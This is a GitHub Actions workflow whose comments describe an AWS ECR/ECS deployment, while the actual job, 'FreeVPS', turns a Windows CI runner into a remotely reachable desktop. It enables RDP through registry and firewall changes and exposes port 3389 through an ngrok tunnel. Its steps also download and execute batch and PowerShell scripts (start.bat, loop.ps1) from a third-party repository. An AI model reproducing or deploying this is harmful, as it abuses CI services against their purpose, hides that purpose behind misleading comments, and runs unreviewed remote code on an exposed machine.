# This workflow will build and push a new container image to Amazon ECR,
# and then will deploy a new task definition to Amazon ECS, when there is a push to the main branch.
#
# To use this workflow, you will need to complete the following set-up steps:
#
# 1. Create an ECR repository to store your images.
#    For example: `aws ecr create-repository --repository-name my-ecr-repo --region us-east-2`.
#    Replace the value of the `ECR_REPOSITORY` environment variable in the workflow below with your repository's name.
#    Replace the value of the `AWS_REGION` environment variable in the workflow below with your repository's region.
#
# 2. Create an ECS task definition, an ECS cluster, and an ECS service.
#    For example, follow the Getting Started guide on the ECS console:
#      https://us-east-2.console.aws.amazon.com/ecs/home?region=us-east-2#/firstRun
#    Replace the value of the `ECS_SERVICE` environment variable in the workflow below with the name you set for the Amazon ECS service.
#    Replace the value of the `ECS_CLUSTER` environment variable in the workflow below with the name you set for the cluster.
#
# 3. Store your ECS task definition as a JSON file in your repository.
#    The format should follow the output of `aws ecs register-task-definition --generate-cli-skeleton`.
#    Replace the value of the `ECS_TASK_DEFINITION` environment variable in the workflow below with the path to the JSON file.
#    Replace the value of the `CONTAINER_NAME` environment variable in the workflow below with the name of the container
#    in the `containerDefinitions` section of the task definition.
#
# 4. Store an IAM user access key in GitHub Actions secrets named `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`.
#    See the documentation for each action used below for the recommended IAM policies for this IAM user,
#    and best practices on handling the access key credentials.

name: FreeVPS

on: workflow_dispatch

jobs:

  build:

    runs-on: windows-latest

    timeout-minutes: 000000

    steps:

    - name: Downloading Ngrok.

      run: |

        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
        
        Invoke-WebRequest https://raw.githubusercontent.com/UserName1080Alyner/advand/main/Outro.zip -OutFile servidor.zip

        Invoke-WebRequest https://raw.githubusercontent.com/UserName1080Alyner/advand/main/start.bat -OutFile start.bat

        Invoke-WebRequest https://raw.githubusercontent.com/UserName1080Alyner/advand/main/wallpaper.jpg -OutFile wallpaper.jpg

        Invoke-WebRequest https://raw.githubusercontent.com/UserName1080Alyner/advand/main/wallpaper.bat -OutFile wallpaper.bat

    - name: Extracting Ngrok and Servidor Files.

      run: Expand-Archive ngrok.zip

    - name: Connecting to your Ngrok account.

      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN

      env:

        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}

    - name: Activating RDP access.

      run: | 

        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0

        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

        copy wallpaper.jpg D:\a\wallpaper.jpg

        copy wallpaper.bat D:\a\wallpaper.bat

    - name: Creating Tunnel.

      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
      
    - name: Connecting to your RDP.

      run: cmd /c start.bat
      
    - name: RDP is ready!

      run: | 

        Invoke-WebRequest https://raw.githubusercontent.com/UserName1080Alyner/advand/main/loop.ps1 -OutFile loop.ps1

        ./loop.ps1
